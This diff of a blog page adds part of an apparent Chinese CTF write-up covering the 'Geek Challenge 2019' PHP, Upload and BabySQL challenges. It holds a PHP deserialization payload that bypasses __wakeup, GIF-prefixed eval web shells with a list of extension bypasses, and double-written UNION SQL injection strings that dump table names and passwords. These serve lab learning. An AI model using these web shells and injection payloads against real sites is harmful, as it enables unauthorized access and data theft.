@@ -74,7 +74,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">3.7k</span>
+            <span class="post-count">4.5k</span>
         </span>
     </span>
 
@@ -83,7 +83,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">16 分钟</span>
+            <span class="post-count">20 分钟</span>
         </span>
     </span>
 </div>
@@ -303,9 +303,55 @@ RequestHandler.settings指向self.application.settings，<br>
 <h2 id="极客大挑战-2019-PHP"><a class="header-anchor" href="#极客大挑战-2019-PHP">¶</a>[极客大挑战 2019]PHP</h2>
 <p>打开题目开到这个  忍不住扫呀</p>
 <p><img src="https://img-blog.csdnimg.cn/20210118001741107.png" alt="在这里插入图片描述"></p>
-<p>试了 www.zip 还真对了。。。 不愧是我。。。</p>
+<p>试了 www.zip 还真对了。。。 不愧是我。。。(忍不住吐槽，这题目真TM的卡)</p>
 <p>打开class.php一看源码</p>
-<p>反序列没错了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>反序列没错了  再看看index.php 发现这一段</p>
+<pre><code>&lt;?php
+include 'class.php';
+$select = $_GET['select'];
+$res=unserialize(@$select);
+?&gt;
+</code></pre>
+<p>可以看到我们关键的点是绕过 _wakeup方法</p>
+<p>当序列化字符串中，表示对象属性个数的值大于实际属性个数时，那么就会跳过wakeup方法的执行</p>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Name</span><br><span class="line">&#123;</span><br><span class="line">    private $username &#x3D; &#39;admin&#39;;</span><br><span class="line">    private $password &#x3D; &#39;100&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new Name();</span><br><span class="line">#进行url编码，防止%00对应的不可打印字符在复制时丢失</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br></pre></td></tr></table></figure>
+<p>将上面得到的payoad 的对象个数改成3就行了</p>
+<h2 id="极客大挑战-2019-Upload"><a class="header-anchor" href="#极客大挑战-2019-Upload">¶</a>[极客大挑战 2019]Upload</h2>
+<p>考点很明显了 文件上传</p>
+<p>随便传个一句话图片试试</p>
+<p>提示不能有  <code>&lt;?</code></p>
+<p>再穿个 phpinfo();进去 提示</p>
+<p><strong>Don’t lie to me, it’s not image at all!!!</strong></p>
+<p>估计是判断文件头了</p>
+<p>上一张图片马试试 也不行 那就用这个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;flag&#39;]);&lt;&#x2F;script&gt; </span><br></pre></td></tr></table></figure>
+<p>bp抓包 改一下content-type 发现php5不行</p>
+<p>用phtml 成功上传</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118130053276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>上蚁剑就行了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118130616955.png" alt="在这里插入图片描述"></p>
+<p>拓展:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1：碰到过一次任意文件上穿漏洞，在config.php中并未发现定义类型Media，请求：upload&#x2F;.php?Type&#x3D;Media</span><br><span class="line">2:上传图片马</span><br><span class="line">3:序列化木马：</span><br><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">	var $a &#x3D; &quot;&lt;?php phpinfo()?&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$aa &#x3D; new A();</span><br><span class="line">echo serialize($aa);</span><br><span class="line">?&gt;</span><br><span class="line">4:php,php3,php4,php5,phtml.pht</span><br><span class="line">5:扩展名绕过</span><br><span class="line">Asp:asa cer cdx</span><br><span class="line">Aspx:ashx asmx ascx</span><br><span class="line">Php:php3 phptml</span><br><span class="line">Jsp:jspx jspf</span><br><span class="line">6:</span><br><span class="line">&lt;script language&#x3D;php&gt;system(&quot;ls&quot;)&lt;&#x2F;script&gt;</span><br><span class="line">7:</span><br><span class="line">GIF89a?</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12243206.html">https://www.cnblogs.com/wangtanzhi/p/12243206.html</a></p>
+<h2 id="极客大挑战-2019-BabySQL"><a class="header-anchor" href="#极客大挑战-2019-BabySQL">¶</a>[极客大挑战 2019]BabySQL</h2>
+<p>试了试万能密码 提示</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118133537924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>明显是 or被过滤了。。  双写试一下 过了 这题应该就是考双写绕过了</p>
+<p>搬出 lovesql的 payload  太坏了太坏了 表名都改了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118133746241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>用自己payload 打不通  我大意了！没闪  IMformation 的or也要双写  又忘了淦！</p>
+<p>查表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;d&amp;password&#x3D;1&#39; uniunionon selselectect 1,2,group_concat(table_name) frofromm infoorrmation_schema.tables whewherere table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210118134207684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>查列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;d&amp;password&#x3D;1&#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns wwherehere table_schema&#x3D;database() aandnd table_name&#x3D;&#96;b4bsql&#96;%23</span><br></pre></td></tr></table></figure>
+<p>有个password 直接打进去看看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin&amp;password&#x3D;1&#39; uniunionon selselectect 2,2,group_concat(passwoorrd) ffromrom &#96;b4bsql&#96;%23</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<h2 id="HCTF-2018-admin"><a class="header-anchor" href="#HCTF-2018-admin">¶</a>[HCTF 2018]admin</h2>
  
       <!-- reward -->
       
